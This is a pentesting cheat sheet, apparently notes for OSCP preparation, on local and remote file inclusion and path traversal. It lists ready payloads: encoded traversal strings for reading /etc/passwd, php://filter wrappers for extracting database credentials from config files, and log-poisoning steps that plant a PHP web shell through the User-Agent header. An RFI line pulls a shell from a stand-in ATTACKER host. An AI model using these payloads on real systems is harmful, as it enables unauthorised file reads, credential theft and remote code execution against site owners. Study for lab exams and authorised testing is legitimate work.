---
status: working
tags:
  - web
  - lfi
  - rfi
  - path-traversal
---
> *Local/Remote File Inclusion and Path Traversal:* Turning a file-path parameter into file read, and then into code execution. Reach for this when a parameter like `?page=`, `?file=`, `?include=`, `?template=`, or `?lang=` changes the response based on the path you supply. The payload lists are grouped on purpose, you try them as a set against one parameter.

## Read Files (traversal)

Start with plain `../` traversal to a known file to prove the bug exists, then escalate to encoded variants only if a filter strips your `../`.

```
?page=../../../../etc/passwd
?page=../../../../etc/passwd%00            (null byte, legacy PHP < 5.3.4)
?page=..%2f..%2f..%2fetc%2fpasswd          (URL-encoded slashes)
?page=%252e%252e%252f                      (double-encoded ../ )
?page=/etc/passwd                          (absolute path)
?page=....\\....\\windows\win.ini          (Windows)
```

> [!note]
> `/etc/passwd` is the Linux proof-file, `win.ini` is the Windows equivalent. Each encoded variant defeats a different filter: URL-encoding beats a naive `../` string match, double-encoding beats a filter that decodes once then checks.

## PHP Wrappers (read source, grab creds from configs)

A raw `include()` of a `.php` file executes it, so you see nothing useful. The base64 filter makes PHP hand you the file contents instead, which you decode locally. This is how you pull database credentials out of `config.php`.

```
?page=php://filter/convert.base64-encode/resource=config.php     -> base64-decode locally
?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index          -> read the app source
```

## LFI to RCE via Log Poisoning

Each route writes your PHP somewhere the vulnerable `include()` will later read, turning file-read into code-execution.

```
1) Poison a log you can write to, then include it:
   - Send a request with PHP in the User-Agent:  User-Agent: <?php system($_GET['c']); ?>
   - Then include the log:   ?page=/var/log/apache2/access.log&c=id
   - Common targets: /var/log/apache2/access.log, /var/log/auth.log (SSH: put PHP in the
     username you try), /var/log/vsftpd.log, /var/log/nginx/access.log, /var/log/nginx/error.log
2) /proc/self/environ  - if readable, a PHP User-Agent lands in the environment and executes when included
3) PHP session file  - seed a value into your session, then include /var/lib/php/sessions/sess_<PHPSESSID>
4) /var/mail/<user>  - SMTP a message containing PHP, then include the mailbox
```

> [!note]
> Access-log poisoning via the User-Agent is the most common and reliable route on OSCP-style boxes. Detailed PoC steps live on HackTricks and PayloadsAllTheThings (see [[Reference Sites]]), this is the map of which to reach for. Once you have code execution, pull a proper shell with [[Reverse Shells]].

## RFI (only when allow_url_include=On)

```
?page=http://ATTACKER/shell.txt        (host a file the target fetches and executes)
```

> [!note]
> Far rarer than LFI on modern targets since remote includes are off by default, but trivial when enabled: the target pulls and runs a file you host. Serve it with the HTTP one-liner from [[High-Frequency One-Liners]].

## See also

- [[Web Enumeration]] for finding the vulnerable parameter
- [[Reverse Shells]] for the payload you trigger once you have RCE
- [[Finding Credentials]] for what to grep out of source you read
- Source: [[OSCP Field Manual]] section 3.1
